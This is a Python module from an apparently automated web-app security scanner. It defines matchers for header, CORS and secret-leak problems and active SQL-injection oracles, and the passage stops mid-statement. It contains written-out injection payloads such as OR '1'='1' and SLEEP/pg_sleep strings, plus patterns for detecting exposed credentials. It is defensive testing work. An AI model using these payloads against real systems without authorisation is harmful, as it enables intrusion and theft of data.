"""Detection primitives.

- MATCHERS: declarative conditions, (response, arg) -> True when slop is present.
- PREDICATES: oracle conditions for hidden sinks, (ctx) -> True when slop is present.

Slop is always the *presence* of a problem (deduction-only): a matcher/predicate returning True
means the probe fires and adds its penalty.
"""
from __future__ import annotations

import contextlib
import gzip
import hashlib
import html
import json
import os
import re
import secrets
import statistics
import time
import urllib.parse
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from dataclasses import replace

import httpx

from . import auth, baas, browser, depscan, email_verify, lighthouse, oob, secretscan
from .net import make_client, request_counts
from .schema import Endpoint
from .discovery import _CATCHALL_PROBE, _body_sig, _registrable_domain


# --- innocence check: never fire a phantom finding on a catch-all / soft-404 SHELL ------------------------
# An SPA / soft-404 host serves the SAME 200 shell for EVERY path (client-side routing has no real server
# 404), so a probe hitting a nonexistent endpoint gets a 200 back and mistakes the shell for a real response
# (a submission once scored a phantom SQLi-40 on a literal 404 page). discovery._drop_phantom_surface already
# drops phantom DISCOVERED endpoints; these guards do the same for the probes that hit LITERAL targets. Every
# endpoint is presumed innocent (a phantom that doesn't exist) until PROVEN real: a probe fires only when its
# response DIFFERS from the shell the host serves to a guaranteed-nonexistent path — a real vulnerability makes
# the endpoint behave distinctly, only phantoms match the shell, so this never suppresses a genuine finding.
_UNSET = object()


def _catch_all_sig(ctx):
    """The app SHELL's fingerprint if this host is a catch-all/soft-404 (a guaranteed-nonexistent path answers
    200 HTML), else None. Computed ONCE per grade against the LIVE app (fresh, not the frozen cache -> can't go
    stale on re-grade) and memoized on ctx."""
    cached = getattr(ctx, "_hl_catchall", _UNSET)
    if cached is not _UNSET:
        return cached
    sig = None
    client = getattr(ctx, "client", None)
    if client is not None:
        try:
            r = client.get(_at(ctx, _CATCHALL_PROBE))
            if r.status_code == 200 and "html" in r.headers.get("content-type", "").lower():
                sig = _body_sig(r.text)
        except (httpx.HTTPError, httpx.InvalidURL):
            pass
    try:
        ctx._hl_catchall = sig          # memoize (tolerates a stub ctx that rejects attribute writes)
    except Exception:
        pass
    return sig


def _is_phantom_shell(ctx, resp) -> bool:
    """Innocence check: True when the host serves a catch-all shell AND `resp` IS that shell — the probed
    endpoint isn't real, it just echoes the shell, so firing on it would be a phantom finding. False on an
    honest host (real 404s) or a response that DIFFERS from the shell (a real endpoint, where genuine findings
    live)."""
    if resp is None:
        return False
    sig = _catch_all_sig(ctx)
    if not sig:
        return False
    try:
        return resp.status_code == 200 and _body_sig(resp.text) == sig
    except Exception:
        return False

_TRACE = re.compile(
    r"Traceback \(most recent call last\)|File \"[^\"]+\", line \d+, in |"   # Python
    r"\bat [\w.$<>]+ ?\([^\s)]+:\d+:\d+\)|"                                  # JS / Node: at fn (file:line:col)
    r"goroutine \d+ \[[\w ]+\]:|"                                            # Go panic
    r"\.rb:\d+:in [`']|"                                                     # Ruby backtrace
    r"Stack trace:\s*#0 "                                                    # PHP
)

# Fingerprints of a framework's DEBUG UI (the full interactive debugger / DEBUG=True page), not merely a
# leaked stack trace. Each string is distinctive enough to avoid firing on ordinary page content.
_DEBUG_FINGERPRINT = re.compile(
    r"Werkzeug Debugger|"                        # Flask / Werkzeug interactive debugger (leaks src + RCE console)
    r"seeing this error because you have|"       # Django DEBUG = True technical-500 page
    r"Better Errors|Rails\.root:|"               # Rails debug (better_errors / web-console)
    r"Whoops, looks like something went wrong",  # Laravel / Symfony (Whoops) debug page
    re.IGNORECASE)


# ---- declarative matchers -------------------------------------------------------------------



def response_contains(resp, arg) -> bool:
    # Reflection check (e.g. an injected XSS marker echoed back unescaped).
    return str(arg) in resp.text


# A config-POLICY check (headers/CORS/compression) is meaningless on a server error: an env-var-dead
# endpoint's 500 error page isn't the app's header policy, and counting it manufactures findings from a
# broken endpoint. The probe fans over many routes, so a HEALTHY page still catches a real omission.
def _policy_applies(resp) -> bool:
    return resp.status_code < 500


# sec-headers-003 (HSTS) scope ONLY: ephemeral platform subdomains whose apex is HSTS-preloaded with
# includeSubDomains -> HTTPS is ALREADY browser-enforced for every *.<suffix>, so a missing per-app HSTS
# header is no real exposure. Suppression only ever REMOVES a penalty (upside-only), so a conservative
# known-suffix list is safe; a custom domain is never suppressed.
_HSTS_PRELOADED_SUFFIXES = (
    # Google's HSTS-preloaded TLDs (whole TLD, includeSubDomains): every *.app / *.dev / *.page has HTTPS
    # browser-enforced, so a missing per-app HSTS header is no real exposure. Subsumes vercel/netlify/web.app +
    # pages.dev, and catches run.app / railway.app / workers.dev / base44.app -- the S1 audit's ~40% preloaded-TLD FP.
    ".app", ".dev", ".page",
    # specific HSTS-preloaded platform domains NOT under a preloaded TLD
    ".onrender.com", ".firebaseapp.com", ".github.io",
)


def response_missing_header(resp, arg) -> bool:
    if not _policy_applies(resp) or str(arg) in resp.headers:   # httpx headers are case-insensitive
        return False
    if str(arg).lower() == "strict-transport-security":         # HSTS probe only — other header probes unchanged
        try:
            host = (resp.url.host or "").lower()
        except Exception:
            host = ""
        if host.endswith(_HSTS_PRELOADED_SUFFIXES):
            return False                                        # preloaded-apex subdomain -> HTTPS already enforced
    return True


def response_missing_clickjacking_defense(resp, arg=None) -> bool:
    # Clickjacking is defended by EITHER X-Frame-Options OR a CSP frame-ancestors directive;
    # checking only one header would false-positive on an app that uses the other.
    if not _policy_applies(resp) or "x-frame-options" in resp.headers:
        return False
    return "frame-ancestors" not in resp.headers.get("content-security-policy", "").lower()


_CSP_NEUTRALIZED = re.compile(r"'nonce-|'sha(?:256|384|512)-|'strict-dynamic'")


def response_csp_weak(resp, arg=None) -> bool:
    """A CSP that's PRESENT but toothless against XSS — script execution allowed via 'unsafe-inline' or a
    scheme/wildcard host source (`*`/`https:`/`http:`), with NO nonce/hash/strict-dynamic to neutralize it, or
    no script restriction at all. Only fires when a CSP exists (absence is response_missing_header's job); a
    modern nonce/hash CSP reads clean. A present-but-weak CSP is a false sense of XSS safety -> graded."""
    if not _policy_applies(resp):
        return False
    csp = resp.headers.get("content-security-policy", "").lower()
    if not csp:
        return False   # absent -> the missing-header probe owns it; don't double-count
    directives = {}
    for part in csp.split(";"):
        toks = part.split()
        if toks:
            directives[toks[0]] = toks[1:]
    script = directives.get("script-src", directives.get("default-src"))
    if script is None:
        return True                                  # no script-src/default-src -> scripts unrestricted
    if _CSP_NEUTRALIZED.search(" ".join(script)):
        return False                                 # nonce/hash/strict-dynamic -> 'unsafe-inline' ignored -> strong
    return any(s in script for s in ("'unsafe-inline'", "*", "https:", "http:"))  # scripts from anywhere


def response_cors_misconfigured(resp, arg=None) -> bool:
    # Slop when the app reflects the request Origin into Access-Control-Allow-Origin AND allows
    # credentials: any site can then make credentialed cross-origin reads. Bare ACAO:* is excluded
    # (browsers refuse credentials with *), so this flags only the genuinely exploitable case.
    if not _policy_applies(resp):
        return False
    sent_origin = resp.request.headers.get("origin", "")
    acao = resp.headers.get("access-control-allow-origin", "")
    creds = resp.headers.get("access-control-allow-credentials", "").lower() == "true"
    return bool(sent_origin) and acao == sent_origin and creds


def response_server_error(resp, arg=None) -> bool:
    # A crash is a 5xx the app caused, not 501 (method not implemented) or 405.
    return resp.status_code in (500, 502, 503, 504)




# sec-headers-006 (X-Powered-By) scope: presence is only a MEANINGFUL leak when the VALUE discloses more
# than the stack FAMILY. A version token (any digit -> "Express/4.18", "PHP/8.1") enables a targeted CVE
# lookup; "ASP.NET" pinpoints the IIS/.NET stack even without a digit. A BARE framework name (Express's
# framework default, a proxy/edge banner) leaks only the family and isn't worth a finding -> suppress
# (precision over recall). Other headers routed through this matcher keep the presence-is-slop contract.
_XPB_DISCLOSURE = re.compile(r"\d|asp\.net", re.IGNORECASE)


def response_has_header(resp, arg) -> bool:
    if not _policy_applies(resp) or str(arg) not in resp.headers:   # presence is slop (leaks stack)
        return False
    if str(arg).lower() == "x-powered-by":                          # value-inspect: fire only on real disclosure
        return bool(_XPB_DISCLOSURE.search(resp.headers.get(str(arg), "")))
    return True


def response_is_aws_credentials(resp, arg=None) -> bool:
    # an AWS credentials file served at the webroot — content-signatured so an SPA catch-all 200 (the
    # index shell) doesn't false-positive the way a bare 200 check would.
    t = resp.text.lower()
    return "aws_access_key_id" in t or "aws_secret_access_key" in t


# High-confidence server secrets that must never reach a client. Precision over recall: we skip
# public-by-design values (Firebase apiKey AIza..., Stripe publishable pk_..., generic JWT session
# tokens), because a false positive wrongly penalizes a non-flaw.
def response_leaks_secret(resp, arg=None) -> bool:
    # one comprehensive, public-key-guarded provider set, shared with the source scan (secretscan._PROVIDER)
    return bool(secretscan.scan_blob(resp.text))


# Credential material an API response must never contain: a populated password-family field, or a
# password-hash signature. High precision by design — password fields are NEVER a legitimate part of
# a response (unlike access/refresh tokens, which ARE the auth flow and are excluded). Masked values
# (***, xxxx, [REDACTED]) and the OpenAPI spec's own schema examples are excluded.
_CRED_FIELD = re.compile(
    r'"(?:password|passwd|pwd|hashed_password|password_hash|pwd_hash|user_password|'
    r'plaintext_password)"\s*:\s*"(?!\s*(?:\*{2,}|x{4,}|redacted|hidden|\.{3})\s*")([^"]{2,})"',
    re.IGNORECASE,
)
# a UI/i18n LABEL, not a credential: a `/api/translate`-style strings endpoint returns "password":"Password" /
# "Enter your password". A phrase of words ending in "password" (letters+spaces only) or a bullet placeholder is
# a label; a real value ("EdyDemo6717!", "P@ssw0rd") has digits/symbols and is NOT excluded.
_CRED_LABEL = re.compile(r"^(?:[a-z]+\s)*passwords?$|^[•●·*]+$", re.IGNORECASE)
_CRED_HASH = re.compile(
    r"\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}"   # bcrypt
    r"|\$argon2(?:id|i|d)\$"                # argon2
    r"|\$6\$[./A-Za-z0-9]{8,}"             # sha512crypt
    r"|\$1\$[./A-Za-z0-9]{6,}"             # md5crypt
    r"|\bpbkdf2_sha256\$\d+\$"             # Django PBKDF2
)
_OPENAPI_DOC = re.compile(r'"(?:openapi|swagger)"\s*:\s*"')


def response_leaks_credentials(resp, arg=None) -> bool:
    if resp.status_code != 200:
        return False
    body = resp.text
    # Excessive data exposure = credentials in a DATA (JSON) response, not in code/markup. A JS bundle
    # with hide?"password":"text" (the Angular/Material password-toggle) is not a leak; genuine secrets
    # hardcoded in JS are caught by response_leaks_secret (key patterns). So require a JSON body.
    ctype = resp.headers.get("content-type", "").lower()
    if "json" not in ctype and body.lstrip()[:1] not in ("{", "["):
        return False
    if _OPENAPI_DOC.search(body[:4000]):
        return False  # a served spec naming a "password" field in its schema isn't a data leak
    if _CRED_HASH.search(body):
        return True   # a password HASH in the body is unambiguous
    # a populated "password":"<value>" -- but only if the value is a real credential, not a UI/i18n label
    # ("password":"Password" from a /api/translate strings endpoint). A real value (EdyDemo6717!) still fires.
    return any(not _CRED_LABEL.match(m.group(1).strip()) for m in _CRED_FIELD.finditer(body))


# Files that must never be served at the webroot (deploying with .env / .git present is classic
# slop). Each requires status 200 AND a content signature, so a 404 / redirect reads clean.
_DOTENV = re.compile(r"(?im)^[ \t]*(?:export[ \t]+)?[A-Z0-9_]*(?:SECRET|PASSWORD|TOKEN|KEY|CREDENTIAL|DATABASE_URL)[A-Z0-9_]*[ \t]*=")


def response_is_dotenv(resp, arg=None) -> bool:
    # A catch-all / SPA host serves its HTML app shell for EVERY path (incl. /.env), and tens of KB of HTML
    # almost always contain a KEY=value-looking substring -> a bare `_DOTENV.search` false-fires on the shell
    # (verified on a live railway catch-all). A real served .env is NOT html: reject a body that opens as an
    # HTML document, or is typed text/html.
    if resp.status_code != 200:
        return False
    body = resp.text
    if body.lstrip()[:20].lower().startswith(("<!doctype", "<html")):
        return False
    hdrs = getattr(resp, "headers", None)
    if hdrs is not None and "html" in hdrs.get("content-type", "").lower():
        return False
    return bool(_DOTENV.search(body))


def response_is_git_config(resp, arg=None) -> bool:
    return resp.status_code == 200 and "[core]" in resp.text and "repositoryformatversion" in resp.text


def response_is_git_head(resp, arg=None) -> bool:
    # symbolic ref (ref: refs/...) OR a detached-HEAD raw commit SHA
    return resp.status_code == 200 and bool(re.fullmatch(r"ref: refs/\S+|[0-9a-f]{40}", resp.text.strip()))


MATCHERS = {
    "response_contains": response_contains,
    "response_missing_header": response_missing_header,
    "response_missing_clickjacking_defense": response_missing_clickjacking_defense,
    "response_csp_weak": response_csp_weak,
    "response_cors_misconfigured": response_cors_misconfigured,
    "response_server_error": response_server_error,
    "response_has_header": response_has_header,
    "response_is_aws_credentials": response_is_aws_credentials,
    "response_leaks_secret": response_leaks_secret,
    "response_leaks_credentials": response_leaks_credentials,
    "response_is_dotenv": response_is_dotenv,
    "response_is_git_config": response_is_git_config,
    "response_is_git_head": response_is_git_head,
}


# ---- oracle predicates ----------------------------------------------------------------------

def _authed(resp) -> bool:
    return resp.status_code == 200 and "welcome" in resp.text.lower()


def sqli_auth_bypass(ctx, probe) -> bool:
    """Boolean/auth-bypass oracle: a benign login fails, an injection payload succeeds. The
    divergence (only possible if the input reaches a live, unparameterized query) is the slop.
    The payload comes from the probe, so variant-group members reuse one oracle with different
    syntaxes."""
    payload = probe.probe.get("payload", "' OR '1'='1' -- ")
    endpoints = ctx.profile.form_endpoints or ["/login"]
    for endpoint in endpoints:
        baseline = ctx.client.post(
            endpoint, data={"username": "zzz_no_such_user", "password": "x"}
        )
        attack = ctx.client.post(endpoint, data={"username": payload, "password": "x"})
        if _authed(attack) and not _authed(baseline):
            ctx.evidence.update(bypassed=True, endpoint=endpoint, payload=payload)
            return True
    ctx.evidence.update(bypassed=False, endpoints_tried=len(endpoints), payload=payload)
    return False


# Error-based SQL injection over the API surface discovered from the OpenAPI spec (path params, query
# params, JSON body fields) — the injection points a form-crawler never sees on a JSON API. Precision
# comes from a differential + a DB-error signature: an unbalanced quote must induce a database error
# string the benign baseline never shows. Only GET/POST are probed (never PUT/PATCH/DELETE), so
# grading can't destroy the target's state.
# Two FAMILIES, and we only had the first. Most entries below name a DRIVER or an exception CLASS
# (psycopg2, sqlalchemy.exc, PG::Error, Npgsql., sqlite3.OperationalError, SQLSTATE[) — the shape you get when
# a stack trace leaks. A modern JSON API does `catch (e) { res.json({error: e.message}) }` and returns only the
# ENGINE's own sentence, with no class name anywhere, so it slipped straight through. Measured on GapBench's
# sqli-raw: the app answers a quote with {"error":"unterminated string at character 35"} at HTTP 200, its
# boolean differential is inert (' OR '1'='1 and ' AND '1'='2 both return 3 rows), so error-based was the only
# technique that could fire and it missed on wording alone. The additions are bare engine text:
#   * `syntax error at or near`  — PostgreSQL's canonical syntax error, the most common one there is
#   * `near "...": syntax error` — SQLite's phrasing of the same
#   * `unterminated string at character` — the character-offset form
# Deliberately NOT `unterminated string` bare: JSON parsers emit "Unterminated string in JSON at position N",
# which an app can echo when a quote is injected into a JSON body — a false positive we would have bought for
# nothing. The baseline guard below (an endpoint whose UNINJECTED response already matches is skipped as
# unattributable) is what makes widening this safe at all.
_SQL_ERROR = re.compile(
    r"SQL syntax|SQLITE_ERROR|sqlite3\.(?:Operational|Integrity|Programming|Interface)Error|"
    r"sqlalchemy\.exc|unrecognized token|unterminated quoted string|"
    r"quoted string not properly terminated|you have an error in your sql syntax|mysqlsyntaxerror|"
    r"com\.mysql|psycopg2|PG::\w*Error|PostgreSQL query failed|ORA-\d{5}|Microsoft OLE DB|"
    r"ODBC SQL Server|SQLSTATE\[|Npgsql\.|unclosed quotation mark|incorrect syntax near|\[SQL:\s|"
    r"syntax error at or near|near \"[^\"]{0,40}\": syntax error|unterminated string at character",
    re.IGNORECASE,
)
_SQLI_BENIGN = "1"
_SQLI_PAYLOAD = "1'"  # a lone quote breaks unparameterized string SQL -> a detectable DB error


def _sqli_slots(ep) -> list[tuple[str, str]]:
    """Injectable positions on an endpoint as (kind, name): path params, query params, body fields."""
    return ([("path", n) for n in ep.path_params]
            + [("query", n) for n in ep.query_params]
            + [("body", n) for n in ep.body_fields])


def _sqli_request(ep, poison, value: str):
    """(path, query_dict, json_body) for ep with the single `poison` slot set to `value` and every
    other slot benign; poison=None yields the all-benign baseline."""
    def sv(kind, name):
        return value if poison == (kind, name) else _SQLI_BENIGN
    path = ep.raw_path
    for n in ep.path_params:
        path = path.replace("{" + n + "}", urllib.parse.quote(sv("path", n), safe=""))
    query = {n: sv("query", n) for n in ep.query_params}
    body = {n: sv("body", n) for n in ep.body_fields} or None
    return path, query, body


# Common query-parameter names to try on a GET endpoint that declares none — a mined SPA path
# (/rest/products/search) or an HTML search form exposes no param schema, so we probe likely names.
_COMMON_PARAMS = ("q", "query", "search", "id", "name", "term", "keyword", "filter")
# Only guess params on GET paths that plausibly take input — keeps the extra requests bounded/precise.
_SEARCHABLE = re.compile(r"search|find|query|filter|lookup|list|products?|items?|users?|orders?", re.I)


def _sqli_targets(profile):
    """Injection targets: OpenAPI/mined endpoints as-is, plus GET HTML forms (fields -> query params)
    and param-less searchable GET endpoints probed with common param names — so a mined
    /rest/products/search and a DVWA-style `?id=` GET form both get exercised, not just declared params."""
    targets = []
    for e in profile.endpoints:
        if (e.method.lower() == "get" and not e.query_params and not e.path_params
                and _SEARCHABLE.search(e.raw_path)):
            targets.append(replace(e, query_params=list(_COMMON_PARAMS)))
        else:
            targets.append(e)
    for f in profile.forms:
        if f.fields and (f.method or "get").lower() == "get":
            targets.append(Endpoint(path=f.action, method="get",
                                    query_params=list(f.fields), raw_path=f.action))
    return targets


# SQLi detection techniques — comprehensive coverage of how ONE flaw ("this parameter reaches an
# unparameterized query") manifests. All share a single finding (the predicate returns once): technique
# breadth is RECALL, not extra penalty. Ordered cheap->expensive; time-based is a bounded last resort.
def _do(c, method, req):
    path, query, body = req
    return c.request(method, path, params=query or None, json=body)


# --- reproducibility: a paste-into-Burp record of the EXACT request that triggered a finding -------------
# An auditor can't verify a finding they can't replay. Each attack probe records `repro` = the request with
# the payload embedded verbatim (method / full url / relevant headers / body) plus the response side that
# confirmed it (status / latency / matched snippet). scripts/stats.py --audit renders it as a curl command.
_REPRO_HEADERS = ("authorization", "apikey", "cookie", "content-type", "origin", "referer",
                  "host", "x-forwarded-host", "x-forwarded-for")


def _repro(method: str, url: str, *, headers=None, body=None, status=None, ms=None, matched=None) -> dict:
    """A replayable record of the request that fired a finding — the payload is embedded in the url/body, so
    it pastes straight into Burp/curl. status/ms/matched capture the response that confirmed it (audit context)."""
    rec = {"method": method.upper(), "url": url}
    hdr = {k: v for k, v in (headers or {}).items()
           if k.lower() in _REPRO_HEADERS or k.lower().startswith("x-")}
    if hdr:
        rec["headers"] = hdr
    if body:
        rec["body"] = body if isinstance(body, str) else json.dumps(body)
    if status is not None:
        rec["status"] = status
    if ms is not None:
        rec["ms"] = ms
    if matched:
        rec["matched"] = str(matched)[:200]
    return rec


def _repro_from_resp(resp, matched=None) -> dict:
    """_repro built from a completed httpx response — the resolved ABSOLUTE request url, its headers/body, the
    response status, and measured latency. A one-liner for any probe that holds the response that fired."""
    req = resp.request
    try:
        body = req.content.decode("utf-8", "replace") if req.content else None
    except httpx.StreamError:   # a streaming/multipart request (a file-upload form) whose body the send already
        body = None             # consumed -> not inline-replayable. RequestNotRead is a StreamError, NOT an
                                # httpx.HTTPError, so it escaped the pipeline's fetch guard and DNF'd the whole
                                # grade (179/1043 apps). Keep method/url/headers so the record still helps.
    try:
        ms = round(resp.elapsed.total_seconds() * 1000)
    except (RuntimeError, AttributeError):
        ms = None
    return _repro(req.method, str(req.url), headers=dict(req.headers),
                  body=(body[:600] if body else None), status=resp.status_code, ms=ms, matched=matched)


def _sqli_repro(ctx, method, reqfn, payload, matched=None) -> dict:
    """_repro for a SQLi fire: reqfn(payload) yields the exact (path, query, body) the probe sent, which we
    render as an absolute url with the injection in place — the auditor replays THAT request in Burp."""
    path, query, body = reqfn(payload)
    url = ctx.base_url.rstrip("/") + path + ("?" + urllib.parse.urlencode(query) if query else "")
    return _repro(method, url, body=(json.dumps(body) if body else None), matched=matched)


def _form_repro(ctx, method, action, data, matched=None) -> dict:
    """_repro for a form/query-param/json send (mirrors _xss_send): GET puts the payload dict in the query,
    POST in a form-encoded body, postjson in a JSON body — so injection probes that hold the (method, action,
    data) can render the request."""
    base = ctx.base_url.rstrip("/") + action
    if method == "postjson":
        return _repro("POST", base, headers={"content-type": "application/json"},
                      body=json.dumps(data), matched=matched)
    if (method or "get").lower() == "get":
        return _repro("GET", base + "?" + urllib.parse.urlencode(data), matched=matched)
    return _repro("POST", base, body=urllib.parse.urlencode(data), matched=matched)


_PREFIX_SENTINEL = "__hl_nx_9z1x__"   # a guaranteed-nonexistent path segment (fixed -> deterministic)


def _endpoint_is_live(ctx, client, path: str, method: str, base_resp) -> bool:
    """Liveness gate for PHANTOM-SENSITIVE probes — the ones that need a REAL server handler to mean
    anything (SQLi, CSRF, rate-limit, crash-resistance). True when `path` has a real handler: its benign
    baseline differs from BOTH the ROOT catch-all shell AND a guaranteed-nonexistent sibling under its OWN
    prefix. A catch-all / soft-404 host serves the same shell for every path (at the root AND per-prefix),
    so firing a server-side probe there invents a finding on an endpoint that does not exist server-side
    (the sec-sqli-40 / rate-limit / crash false positives). An HONEST host (real 404s for nonexistent
    paths) always passes, so genuine findings still fire — this only suppresses phantoms. It is the single
    gate that generalizes the root innocence check (_is_phantom_shell) and the per-prefix catch-all check.
    Universal probes (headers/a11y/perf) never call it: a missing header is missing on a catch-all shell too."""
    if base_resp is None:
        return True                        # no baseline to judge -> don't suppress; the probe's oracle decides
    if _is_phantom_shell(ctx, base_resp):
        return False                       # baseline IS the root catch-all shell -> phantom endpoint
    prefix = path.rsplit("/", 1)[0]
    fake = f"{prefix}/{_PREFIX_SENTINEL}" if prefix else "/" + _PREFIX_SENTINEL
    try:
        r = client.request((method or "get").upper(), fake)
        if r.status_code == base_resp.status_code and _body_sig(r.text) == _body_sig(base_resp.text):
            return False                   # a nonexistent sibling answers identically -> per-prefix catch-all
    except (httpx.HTTPError, httpx.InvalidURL):
        pass
    except Exception:
        pass
    return True


# TWO payloads, tried in order, because they break DIFFERENT things. "1'" closes a quoted literal and leaves a
# dangling quote — the standard error-based probe. A BARE "'" sends nothing but the quote, which some apps treat
# differently: a value-shaped input can be coerced, length-checked or cast before it reaches SQL while a lone
# quote is not. Measured on GapBench's sqli-raw, which answers `?username=1'` with rows and no error but
# `?username='` with {"error":"unterminated string at character 35"} — one payload found it, the other did not,
# and we only ever sent the one. (That target is a lenient emulation: a real engine errors on both, since
# `WHERE username = '1''` leaves a literal open. The breadth is worth having regardless — sending a single
# payload for a whole technique is the same narrowness the SQLi variants exist to avoid.)
_SQLI_ERROR_PAYLOADS = (_SQLI_PAYLOAD, "'")


def _tech_error(c, method, reqfn):
    """A quote induces a DB-error signature (the app leaks SQL errors) -> return (MATCHED signature, the
    payload that produced it), else (None, None). Reporting the payload keeps the repro honest: with more than
    one candidate, naming the wrong one hands the auditor a request that does not reproduce. The signature set
    is specific DB strings a validation error or SPA shell can't produce, so a match is a high-confidence
    leak. PAIRED CANARY (v2.0 foundation #2): a candidate match is confirmed only if a bare literal with NO SQL
    syntax does NOT also produce the signature; if it does, the string is reflected/generated (an LLM describing
    a SQL error, an echoed error template) rather than caused by the quote -> not causally specific -> suppress."""
    for payload in _SQLI_ERROR_PAYLOADS:
        m = _SQL_ERROR.search(_do(c, method, reqfn(payload)).text)
        if m:
            if _SQL_ERROR.search(_do(c, method, reqfn(_SQLI_NOISE_A)).text):
                return None, None   # bare literal (no quote) reproduces the error signature -> not attributable (#2)
            if not _reproduces(lambda: _do(c, method, reqfn(payload)), lambda r: _SQL_ERROR.search(r.text)):
                return None, None   # the quote's error does not reproduce -> nondeterministic endpoint (#1)
            return m.group(0), payload
    return None, None


_SQLI_TRUE = "1' OR '1'='1' -- "
_SQLI_FALSE = "1' OR '1'='2' -- "   # SAME length as TRUE; differs only in the boolean's truth value
_SQLI_NOISE_A = "hlqa7k3m9pd2"      # two DIFFERENT inert benign values (no SQL semantics) that establish the
_SQLI_NOISE_B = "hlzb2w8x4rn6"      # endpoint's own NOISE FLOOR: if THESE already diverge, its output is
                                    # content-driven (an LLM/TTS/proxy echoes the input), not a SQL result set.

# --- causal-specificity invariant (sits next to intent-independence + shape-independence) ---------------
# On an AI-app corpus, ANY oracle keying on a time delta, an error, or a marker reflection shares one
# confound: an LLM / media generator / API proxy passthrough can emit the signal with NO vulnerability — a
# slow upstream looks like SLEEP, an echoed marker looks like a UNION, per-input output looks like a boolean
# split. So an oracle must key on evidence CAUSALLY SPECIFIC to the vuln: a ground-truth state change (auth
# bypass), a DB-specific error string, or a differential controlled against the endpoint's OWN noise floor —
# never a signal any proxy/LLM passthrough can produce. And suppress when the response names an upstream
# vendor error (its output/latency track the upstream, not the app's DB). See _UPSTREAM_ERROR.


def _diverges(a, b) -> bool:
    """Two responses differ materially: status, or a body-size gap too large for equal-length reflected
    payloads to explain."""
    if a.status_code != b.status_code:
        return True
    hi, lo = max(len(a.text), len(b.text)), min(len(a.text), len(b.text))
    return hi - lo > max(64, hi * 0.15)


def _boolean_split(t, f) -> bool:
    """A DIRECTIONAL boolean-blind split. `col='1' OR '1'='1'` (TRUE) selects EVERY row; `col='1' OR '1'='2'`
    (FALSE) selects only the col='1' subset — so TRUE returns a SUPERSET of FALSE and a genuine split has the
    TRUE body DOMINATING FALSE: a status flip (rows vs none), or, at equal status, a TRUE body no smaller than
    FALSE. The retired symmetric `_diverges` also fired when a fuzzy search returned a different-SIZED hit per
    query STRING with no ordering — roadio's geocoder answered FALSE='1'='2' with 2023B (Guatemala) > TRUE with
    312B (Iceland), a v18 false positive. Requiring the direction rejects that while still catching a real
    result-set gate (the reversed case is not how `OR 1=1` vs `OR 1=2` behaves)."""
    if not _diverges(t, f):
        return False
    if t.status_code != f.status_code:
        return True                       # a true/false STATUS flip (both payloads are quote-shaped) is SQL-specific
    return len(t.text) >= len(f.text)     # equal status -> TRUE (all rows) must be at least as large as FALSE


def _reproduces(send, signal) -> bool:
    """Determinism gate (v2.0 LLM-echo foundation #1): re-send the IDENTICAL request that just matched; its
    boolean oracle SIGNAL must reproduce. A content-oracle match on a nondeterministic endpoint (a flaky
    upstream, per-request generation, an LLM in the response path) does not reproduce -> can't-assess, not a
    fire. Comparing the SIGNAL (does the DB-error / file-content pattern match), not the raw body, tolerates
    benign nonces / timestamps / request-ids that vary without moving it. Together with the caller's original
    send this is the roadmap's 'send each request twice'; `send()` issues it, `signal(resp)` is the feature."""
    return bool(signal(send()))


def _tech_boolean(c, method, reqfn) -> bool:
    """Strict boolean-blind, gated THREE ways against the AI-corpus confounds — a content-reflective search or
    an LLM in the response path can fake a true/false split, and both did on v18 (0/2 scored boolean fires were
    real). (1) NOISE FLOOR: two DIFFERENT inert benign values; if THEY already diverge the output is content-
    driven (an LLM/TTS/proxy varies with the input) -> suppress (error-based still runs). (2) DETERMINISM: the
    SAME payload sent twice must reproduce — guardian's /api/case-update feeds new_status_label to an LLM that
    writes fresh guidance each call, so identical requests diverge; its true/false gap is generation variance,
    not a boolean, and the old 'reproduce on a second pair' passed because ANY two LLM outputs differ. (3)
    DIRECTIONAL SPLIT: TRUE (OR 1=1, every row) must DOMINATE FALSE (OR 1=2, a subset), reproduced on a second
    pair — roadio's geocoder returned a different-sized place per string (FALSE > TRUE, the wrong direction) and
    tripped the old symmetric divergence. This is the differential-control form of the causal-specificity
    invariant above; the three gates together are what a content-reflective endpoint cannot fake."""
    if _diverges(_do(c, method, reqfn(_SQLI_NOISE_A)), _do(c, method, reqfn(_SQLI_NOISE_B))):
        return False   # (1) content-reflective endpoint -> the differential oracle is confounded
    true1 = _do(c, method, reqfn(_SQLI_TRUE))
    if _diverges(true1, _do(c, method, reqfn(_SQLI_TRUE))):
        return False   # (2) identical requests already diverge -> generative/LLM endpoint, not a SQL result set
    if not _boolean_split(true1, _do(c, method, reqfn(_SQLI_FALSE))):
        return False   # (3) TRUE must select a SUPERSET of FALSE, not merely differ in size (rejects the geocoder)
    return _boolean_split(_do(c, method, reqfn(_SQLI_TRUE)), _do(c, method, reqfn(_SQLI_FALSE)))  # reproduce the split


# UNION is CUT from api_sqli: its oracle (a concatenated marker appears in the body) is unsalvageable on an
# LLM corpus — the app quotes the marker back as generated content, so the reflection isn't causally specific
# to a UNION executing. Retired from the score with no advisory (per the causal-specificity invariant above).

_TIME_PAYLOADS = ("1' OR SLEEP({d}) -- ", "1'||pg_sleep({d})-- ",
                  "1'); SELECT pg_sleep({d})-- ", "1' AND SLEEP({d})=0 -- ")


def _tech_time(c, method, reqfn, delay) -> bool:
    """ADVISORY only (never scored — see api_sqli). A blind time-delay that SCALES with the injected sleep
    argument: inject SLEEP(delay) and SLEEP(3*delay) — a real sleep makes the response-time DELTA track the
    dose (the 3x adds ~2*delay), whereas a slow upstream/proxy has a FIXED latency that ignores the argument.
    Confirmed on both trials. Reported as 'possible blind sqli (unverified)' for human review: a proxy's
    latency is not the app's SQL, so absolute or single-dose timing can't be causally specific."""
    def elapsed(v):
        t0 = time.perf_counter()
        _do(c, method, reqfn(v))
        return time.perf_counter() - t0
    for tmpl in _TIME_PAYLOADS:
        # the 3x dose must add ~2*delay of latency on BOTH trials (linear scaling), not a fixed offset:
        # a NewsAPI/OpenStates proxy's latency doesn't track the SLEEP argument, a real sleep does.
        if all(elapsed(tmpl.format(d=delay * 3)) - elapsed(tmpl.format(d=delay)) >= delay * 1.4
               for _ in range(2)):
            return True
    return False


# An upstream-vendor error in the body means the endpoint PROXIES a third-party API — its output and latency
# track that upstream, not the app's own DB, so every differential SQLi oracle is confounded there. Suppress
# it (grade the app's DB, never its passthrough). Concrete tells: "NewsAPI 429 …", "OpenStates API error:
# 504 - Gateway Time-out", rate-limit / quota / bad-gateway bodies. See the causal-specificity invariant.
_UPSTREAM_ERROR = re.compile(
